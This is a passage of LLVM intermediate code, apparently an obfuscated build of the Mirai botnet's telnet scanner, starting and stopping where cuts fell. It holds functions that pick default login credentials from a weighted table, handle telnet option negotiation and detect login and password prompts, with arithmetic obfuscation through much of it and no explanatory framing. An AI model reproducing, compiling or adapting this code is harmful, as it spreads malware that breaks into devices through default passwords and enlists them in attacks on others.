  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = xor i32 2048, -1
  %35 = xor i32 %33, -1
  %36 = xor i32 -1699311679, -1
  %37 = and i32 %34, -1699311679
  %38 = and i32 2048, %36
  %39 = and i32 %35, -1699311679
  %40 = and i32 %33, %36
  %41 = or i32 %37, %38
  %42 = or i32 %39, %40
  %43 = xor i32 %41, %42
  %44 = or i32 %34, %35
  %45 = xor i32 %44, -1
  %46 = or i32 -1699311679, %36
  %47 = and i32 %45, %46
  %48 = or i32 %43, %47
  %49 = or i32 2048, %33
  %50 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %48)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 4
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 5
  %59 = load i16, i16* %58, align 8
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = load i32, i32* @fake_time, align 4
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 2
  store i32 %61, i32* %63, align 4
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 3
  store i32 1, i32* %65, align 8
  %66 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 1
  %68 = load i32, i32* %67, align 8
  %69 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %70 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %70, %struct.sockaddr** %69, align 8
  %71 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %72 = load %struct.sockaddr*, %struct.sockaddr** %71, align 8
  %73 = call i32 @connect(i32 %68, %struct.sockaddr* %72, i32 16)
  br label %74

; <label>:74:                                     ; preds = %21, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set.28*, %struct.fd_set.28*, %struct.fd_set.28*, %struct.timeval.29*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %49

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %50

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = sub i32 %44, -2127461669
  %46 = add i32 %45, 1
  %47 = add i32 %46, -2127461669
  %48 = add nsw i32 %44, 1
  store i32 %47, i32* %2, align 4
  br label %9

; <label>:49:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %50

; <label>:50:                                     ; preds = %49, %36
  %51 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %51
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %45

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %44

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = sub i32 0, 1
  %42 = sub i32 %40, %41
  %43 = add nsw i32 %40, 1
  store i32 %42, i32* %10, align 4
  br label %21

; <label>:44:                                     ; preds = %21
  br label %45

; <label>:45:                                     ; preds = %44, %4
  %46 = load i32, i32* %9, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %149, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %150

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %150

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %148

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %150

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %47

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = sub i32 0, 2
  %45 = sub i32 %43, %44
  %46 = add nsw i32 %43, 2
  store i32 %45, i32* %3, align 4
  br label %11

; <label>:47:                                     ; preds = %34
  %48 = load i8*, i8** %4, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 1
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 253
  br i1 %52, label %53, label %86

; <label>:53:                                     ; preds = %47
  %54 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %55 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %56 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %57 = load i8*, i8** %4, align 8
  %58 = call signext i8 @can_consume(%struct.scanner_connection* %56, i8* %57, i32 2)
  %59 = icmp ne i8 %58, 0
  br i1 %59, label %61, label %60

; <label>:60:                                     ; preds = %53
  br label %150

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %4, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 2
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp ne i32 %65, 31
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %61
  br label %87

; <label>:68:                                     ; preds = %61
  %69 = load i8*, i8** %4, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 3
  store i8* %70, i8** %4, align 8
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 %71, -1728816752
  %73 = add i32 %72, 3
  %74 = add i32 %73, -1728816752
  %75 = add nsw i32 %71, 3
  store i32 %74, i32* %3, align 4
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 1
  %78 = load i32, i32* %77, align 8
  %79 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %80 = call i64 @send(i32 %78, i8* %79, i64 3, i32 16384)
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 1
  %83 = load i32, i32* %82, align 8
  %84 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %85 = call i64 @send(i32 %83, i8* %84, i64 9, i32 16384)
  br label %146

; <label>:86:                                     ; preds = %47
  br label %87

; <label>:87:                                     ; preds = %86, %67
  %88 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %89 = load i8*, i8** %4, align 8
  %90 = call signext i8 @can_consume(%struct.scanner_connection* %88, i8* %89, i32 2)
  %91 = icmp ne i8 %90, 0
  br i1 %91, label %93, label %92

; <label>:92:                                     ; preds = %87
  br label %150

; <label>:93:                                     ; preds = %87
  store i32 0, i32* %5, align 4
  br label %94

; <label>:94:                                     ; preds = %125, %93
  %95 = load i32, i32* %5, align 4
  %96 = icmp slt i32 %95, 3
  br i1 %96, label %97, label %132

; <label>:97:                                     ; preds = %94
  %98 = load i8*, i8** %4, align 8
  %99 = load i32, i32* %5, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %98, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 253
  br i1 %104, label %105, label %110

; <label>:105:                                    ; preds = %97
  %106 = load i8*, i8** %4, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  store i8 -4, i8* %109, align 1
  br label %124

; <label>:110:                                    ; preds = %97
  %111 = load i8*, i8** %4, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 251
  br i1 %117, label %118, label %123

; <label>:118:                                    ; preds = %110
  %119 = load i8*, i8** %4, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  store i8 -3, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %118, %110
  br label %124

; <label>:124:                                    ; preds = %123, %105
  br label %125

; <label>:125:                                    ; preds = %124
  %126 = load i32, i32* %5, align 4
  %127 = sub i32 0, %126
  %128 = sub i32 0, 1
  %129 = add i32 %127, %128
  %130 = sub i32 0, %129
  %131 = add nsw i32 %126, 1
  store i32 %130, i32* %5, align 4
  br label %94

; <label>:132:                                    ; preds = %94
  %133 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %134 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 8
  %136 = load i8*, i8** %4, align 8
  %137 = call i64 @send(i32 %135, i8* %136, i64 3, i32 16384)
  %138 = load i8*, i8** %4, align 8
  %139 = getelementptr inbounds i8, i8* %138, i64 3
  store i8* %139, i8** %4, align 8
  %140 = load i32, i32* %3, align 4
  %141 = sub i32 0, %140
  %142 = sub i32 0, 3
  %143 = add i32 %141, %142
  %144 = sub i32 0, %143
  %145 = add nsw i32 %140, 3
  store i32 %144, i32* %3, align 4
  br label %146

; <label>:146:                                    ; preds = %132, %68
  br label %147

; <label>:147:                                    ; preds = %146
  br label %148

; <label>:148:                                    ; preds = %147, %23
  br label %149

; <label>:149:                                    ; preds = %148
  br label %11

; <label>:150:                                    ; preds = %92, %60, %33, %22, %11
  %151 = load i32, i32* %3, align 4
  ret i32 %151
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = add i32 %13, 2051342568
  %15 = sub i32 %14, 1
  %16 = sub i32 %15, 2051342568
  %17 = sub nsw i32 %13, 1
  store i32 %16, i32* %5, align 4
  br label %18

; <label>:18:                                     ; preds = %73, %1
  %19 = load i32, i32* %5, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %79

; <label>:21:                                     ; preds = %18
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %23, i64 0, i64 %25
  %27 = load i8, i8* %26, align 1
  %28 = sext i8 %27 to i32
  %29 = icmp eq i32 %28, 58
  br i1 %29, label %66, label %30

; <label>:30:                                     ; preds = %21
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 7
  %33 = load i32, i32* %5, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 62
  br i1 %38, label %66, label %39

; <label>:39:                                     ; preds = %30
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 36
  br i1 %47, label %66, label %48

; <label>:48:                                     ; preds = %39
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 35
  br i1 %56, label %66, label %57

; <label>:57:                                     ; preds = %48
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 7
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %59, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 37
  br i1 %65, label %66, label %72

; <label>:66:                                     ; preds = %57, %48, %39, %30, %21
  %67 = load i32, i32* %5, align 4
  %68 = add i32 %67, -763845328
  %69 = add i32 %68, 1
  %70 = sub i32 %69, -763845328
  %71 = add nsw i32 %67, 1
  store i32 %70, i32* %6, align 4
  br label %79

; <label>:72:                                     ; preds = %57
  br label %73

; <label>:73:                                     ; preds = %72
  %74 = load i32, i32* %5, align 4
  %75 = sub i32 %74, -1094198557
  %76 = add i32 %75, -1
  %77 = add i32 %76, -1094198557
  %78 = add nsw i32 %74, -1
  store i32 %77, i32* %5, align 4
  br label %18

; <label>:79:                                     ; preds = %66, %18
  %80 = load i32, i32* %6, align 4
  %81 = icmp eq i32 %80, -1
  br i1 %81, label %82, label %121

; <label>:82:                                     ; preds = %79
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %83 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %83, i8** %9, align 8
  %84 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %84, i8** %10, align 8
  %85 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %86 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %85, i32 0, i32 7
  %87 = getelementptr inbounds [256 x i8], [256 x i8]* %86, i32 0, i32 0
  %88 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %89 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %88, i32 0, i32 6
  %90 = load i32, i32* %89, align 4
  %91 = load i8*, i8** %9, align 8
  %92 = load i32, i32* %8, align 4
  %93 = sub i32 0, 1
  %94 = add i32 %92, %93
  %95 = sub nsw i32 %92, 1
  %96 = call i32 @util_memsearch(i8* %87, i32 %90, i8* %91, i32 %94)
  %97 = icmp ne i32 %96, -1
  %98 = zext i1 %97 to i32
  store i32 %98, i32* %7, align 4
  br i1 %97, label %99, label %101

; <label>:99:                                     ; preds = %82
  %100 = load i32, i32* %7, align 4
  store i32 %100, i32* %6, align 4
  br label %120

; <label>:101:                                    ; preds = %82
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %103 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %102, i32 0, i32 7
  %104 = getelementptr inbounds [256 x i8], [256 x i8]* %103, i32 0, i32 0
  %105 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %106 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %105, i32 0, i32 6
  %107 = load i32, i32* %106, align 4
  %108 = load i8*, i8** %10, align 8
  %109 = load i32, i32* %8, align 4
  %110 = add i32 %109, -1244976174
  %111 = sub i32 %110, 1
  %112 = sub i32 %111, -1244976174
  %113 = sub nsw i32 %109, 1
  %114 = call i32 @util_memsearch(i8* %104, i32 %107, i8* %108, i32 %112)
  %115 = icmp ne i32 %114, -1
  %116 = zext i1 %115 to i32
  store i32 %116, i32* %7, align 4
  br i1 %115, label %117, label %119

; <label>:117:                                    ; preds = %101
  %118 = load i32, i32* %7, align 4
  store i32 %118, i32* %6, align 4
  br label %119

; <label>:119:                                    ; preds = %117, %101
  br label %120

; <label>:120:                                    ; preds = %119, %99
  br label %121

; <label>:121:                                    ; preds = %120, %79
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %122 = load i32, i32* %6, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  store i32 0, i32* %2, align 4
  br label %127

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %6, align 4
  store i32 %126, i32* %2, align 4
  br label %127

; <label>:127:                                    ; preds = %125, %124
  %128 = load i32, i32* %2, align 4
  ret i32 %128
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub nsw i32 %12, 1
  store i32 %14, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %63, %1
  %17 = load i32, i32* %5, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %70

; <label>:19:                                     ; preds = %16
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 7
  %22 = load i32, i32* %5, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = icmp eq i32 %26, 58
  br i1 %27, label %55, label %28

; <label>:28:                                     ; preds = %19
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 62
  br i1 %36, label %55, label %37

; <label>:37:                                     ; preds = %28
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [256 x i8], [256 x i8]* %39, i64 0, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 36
  br i1 %45, label %55, label %46

; <label>:46:                                     ; preds = %37
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 7
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = sext i8 %52 to i32
  %54 = icmp eq i32 %53, 35
  br i1 %54, label %55, label %62

; <label>:55:                                     ; preds = %46, %37, %28, %19
  %56 = load i32, i32* %5, align 4
  %57 = sub i32 0, %56
  %58 = sub i32 0, 1
  %59 = add i32 %57, %58
  %60 = sub i32 0, %59
  %61 = add nsw i32 %56, 1
  store i32 %60, i32* %6, align 4
  br label %70

; <label>:62:                                     ; preds = %46
  br label %63

; <label>:63:                                     ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = sub i32 0, %64
  %66 = sub i32 0, -1
  %67 = add i32 %65, %66
  %68 = sub i32 0, %67
  %69 = add nsw i32 %64, -1
  store i32 %68, i32* %5, align 4
  br label %16

; <label>:70:                                     ; preds = %55, %16
  %71 = load i32, i32* %6, align 4
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %92

; <label>:73:                                     ; preds = %70
  call void @table_unlock_val(i8 zeroext 25)
  %74 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %74, i8** %7, align 8
  %75 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %76 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i32 0, i32 7
  %77 = getelementptr inbounds [256 x i8], [256 x i8]* %76, i32 0, i32 0
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 6
  %80 = load i32, i32* %79, align 4
  %81 = load i8*, i8** %7, align 8
  %82 = load i32, i32* %9, align 4
  %83 = sub i32 0, 1
  %84 = add i32 %82, %83
  %85 = sub nsw i32 %82, 1
  %86 = call i32 @util_memsearch(i8* %77, i32 %80, i8* %81, i32 %84)
  %87 = icmp ne i32 %86, -1
  %88 = zext i1 %87 to i32
  store i32 %88, i32* %8, align 4
  br i1 %87, label %89, label %91

; <label>:89:                                     ; preds = %73
  %90 = load i32, i32* %8, align 4
  store i32 %90, i32* %6, align 4
  br label %91

; <label>:91:                                     ; preds = %89, %73
  br label %92

; <label>:92:                                     ; preds = %91, %70
  call void @table_lock_val(i8 zeroext 25)
  %93 = load i32, i32* %6, align 4
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %92
  store i32 0, i32* %2, align 4
  br label %98

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %6, align 4
  store i32 %97, i32* %2, align 4
  br label %98

; <label>:98:                                     ; preds = %96, %95
  %99 = load i32, i32* %2, align 4
  ret i32 %99
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
